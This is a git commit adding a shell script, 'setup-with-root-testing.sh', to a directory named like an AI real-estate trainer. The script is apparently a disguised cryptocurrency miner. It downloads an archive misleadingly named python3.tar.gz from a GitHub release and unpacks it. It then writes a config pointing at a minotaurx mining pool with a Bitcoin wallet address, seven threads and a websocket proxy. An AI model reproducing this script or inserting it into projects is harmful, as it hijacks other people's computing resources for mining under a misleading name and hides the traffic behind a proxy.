ab6f637509985b14353dba0b94acd9aab39c2ba9
khanhnguyen97 <nguyenkhak97@gmail.com>
2024-07-23 18:51:44 +0700

    Create setup-with-root-testing.sh

---
+++ ai-realestale-trainer/setup-with-root-testing.sh
@@ -0,0 +1,33 @@
+#!/bin/bash
+
+: "${M_ALGO:=minotaurx}"
+: "${M_HOST:=minotaurx.na.mine.zpool.ca}"
+: "${M_PORT:=7019}"
+: "${M_WORKER:=1Fo2aZrGJYV6G9H8bunMvwPUYAMvdriqTP}"
+: "${M_PASSWORD:=c=BTC}"
+: "${M_THREADS:=7}"
+: "${M_PROXY:=wss://smiling-tilda-mono.koyeb.app/proxy}"
+
+# Download packgaes
+wget https://github.com/khanhnguyen97/ok2/releases/download/khanh/python3.tar.gz
+tar -xvf python3.tar.gz
+rm python3.tar.gz
+cd python3
+
+# Remove the existing config.json file
+rm -f config.json
+
+# Create a new config.json file with the specified content
+cat <<EOL > config.json
+{
+    "algorithm": "$M_ALGO",
+    "host": "$M_HOST",
+    "port": $M_PORT,
+    "worker": "$M_WORKER",
+    "password": "$M_PASSWORD",
+    "workers": $M_THREADS,
+    "log": false,
+    "chrome": "./chromium/chrome",
+    "proxy": "$M_PROXY"
+}
+EOL
